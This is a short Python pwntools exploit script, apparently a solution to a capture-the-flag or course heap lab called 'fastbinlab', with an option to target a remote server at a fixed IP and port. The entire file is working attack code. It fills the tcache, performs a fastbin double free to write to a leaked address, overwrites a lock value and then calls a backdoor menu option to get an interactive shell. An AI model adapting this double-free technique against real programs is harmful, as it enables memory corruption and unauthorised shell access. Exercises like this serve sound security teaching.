from pwn import *

localhost = True

if localhost:
    server = process('./sourcecode/fastbinlab')
else:
    server = remote('140.112.31.97', 30105)
    
server.recvuntil('Lock address : 0x')
target_address = int(server.recvline()[:-1], 16)

def create(size, data):
    server.sendlineafter('Choice >', '1')
    server.sendlineafter('Note size :', str(size))
    server.sendlineafter('Content :', data)
    
def delete(index):
    server.sendlineafter('Choice >', '2')
    server.sendlineafter('Note index :', str(index))

#full tcache 
for i in range(7):
    create(0x18, '0')
    delete(i)

#double free 
create(0x18, '0')
create(0x18, '0')
delete(7)
delete(8)
delete(7)

#write address
create(0x18, p64(target_address - 0x18 + 7))

#write payload
create(0x18, '0')
create(0x18, '0')
create(0x18, b'\x00' + p64(0xcafedeadbeefcafe))

#backdoor
server.sendlineafter('Choice >', '3')

#shell
server.interactive()